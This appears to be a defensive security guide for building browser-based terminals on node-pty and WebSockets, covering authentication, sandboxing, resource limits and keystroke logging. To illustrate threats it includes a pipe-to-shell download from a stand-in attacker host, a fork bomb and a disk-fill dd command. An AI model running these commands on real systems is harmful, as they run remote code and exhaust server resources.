# Security

A web terminal is a remote code execution endpoint. Treat it that way. Most of the disasters in this space come from developers who built a terminal to impress a stakeholder demo and shipped it to production without re-evaluating.

## Threat model

The default posture of `pty.spawn(bash)` is: **anyone who can reach the WebSocket gets an interactive shell running as the Node process's user, with its full filesystem and network access.** There's no sandbox. There's no command filter. `curl evil.com/install.sh | sh` just works.

Before anything else, answer these for the user's situation:
1. Who is supposed to be able to open a terminal? (Authenticated users of their app? Only admins? The general public? — the last one is almost never right.)
2. What should the shell be able to do? (Run anything? Only specific commands? Only inside a container or chroot?)
3. Who runs the shell? (The same user as the Node server? A dedicated low-privilege user? A user per tenant?)

## Authentication

The WebSocket upgrade request is an HTTP request; authenticate it like any other. Common mistakes:

- **Authenticating the page but not the WebSocket.** The React app is served behind login, but `ws://host/pty` has no auth. An attacker just opens the WebSocket directly.
- **Trusting cookies alone without CSRF protection.** WebSockets don't enforce same-origin by default. Check the `Origin` header in the upgrade handler and reject unexpected origins.
- **Putting the session token in the URL.** URLs get logged, appear in referer headers, and show up in browser history. Send auth in the first message after connection, or use a short-lived single-use token fetched from an authenticated HTTP endpoint.

Minimal pattern — check a JWT (or session cookie) in the WebSocket upgrade:

```js
import { WebSocketServer } from 'ws';
const wss = new WebSocketServer({ noServer: true });

server.on('upgrade', async (req, socket, head) => {
  try {
    const user = await authenticate(req); // your auth logic
    if (!user) throw new Error('unauthorized');
    wss.handleUpgrade(req, socket, head, (ws) => {
      ws.user = user;
      wss.emit('connection', ws, req);
    });
  } catch {
    socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
    socket.destroy();
  }
});
```

## Sandboxing

The host OS is the wrong sandbox boundary unless the user is already trusted to run arbitrary code there. Options in rough order of strength:

1. **Container per session.** Spawn a Docker/Podman container and `pty.spawn('docker', ['exec', '-it', containerId, 'bash'])` into it. The user gets root in the container, but the container is ephemeral and isolated. Set memory/CPU limits; disable privileged mode; drop capabilities; use a read-only root fs where possible.

2. **Chroot or user namespace.** Lighter than a container but also weaker. Reasonable for restricted file browsing, not enough for hostile users.

3. **Dedicated unprivileged user.** `pty.spawn('su', ['-', 'sandboxed_user'])` or equivalent. Limits blast radius but the user can still read anything that user can read, including potentially other tenants' data if they share the filesystem.

4. **Command allowlist via restricted shell.** `rbash`, `lshell`, or a custom shell script that only exec's approved commands. Hard to get right — there are many ways to escape a restricted shell.

Do not rely on filtering input strings for "dangerous commands." It doesn't work. Shells have variable expansion, `eval`, globbing, command substitution, `source`, base64-decoded payloads, etc. The only reliable filters operate on syscalls or on what the process can reach, not on the command line.

## Resource limits

Even authenticated users can accidentally or deliberately DoS the server:

- **Fork bombs.** A single `:(){ :|:& };:` will exhaust process tables. Use `ulimit -u` per PTY, or rely on container process limits.
- **Memory exhaustion.** Run `cat /dev/urandom`, pipe into something, or just allocate. Set memory limits at the container level.
- **Disk fill.** `dd if=/dev/zero of=/tmp/pad bs=1M`. Quota or read-only mounts.
- **Output flooding.** `yes` produces gigabytes per second. The PTY happily generates output faster than the WebSocket can drain it. Node buffers it in memory. Solution: use `ptyProcess.pause()` / `resume()` based on WebSocket backpressure, or cap the send buffer and drop/disconnect when it overflows.

Also bound:
- Max concurrent PTYs per user and globally.
- Idle timeout (close sessions with no input for N minutes).
- Max session duration.

## Don't log raw input

Users will type passwords, tokens, and SSH keys into the terminal. Logging all keystrokes creates a high-value target and, in many jurisdictions, a compliance problem. If you must log for audit purposes, log commands (parsed from shell history) rather than keystrokes, and encrypt the logs with access controls.

## What to tell the user

When someone asks for a terminal feature, surface the security questions early, not at the end. A rough checklist to walk through before shipping:

- [ ] Is the WebSocket upgrade authenticated?
- [ ] Is the `Origin` header validated?
- [ ] Does the PTY run as a non-root, non-application user?
- [ ] Is there a sandbox boundary between the PTY and anything valuable on the host?
- [ ] Are there per-session and global resource limits?
- [ ] Is there an idle timeout?
- [ ] Are keystrokes kept out of logs?
- [ ] Is the endpoint behind the same network perimeter (VPN, IP allowlist, or similar) as the rest of the admin surface?
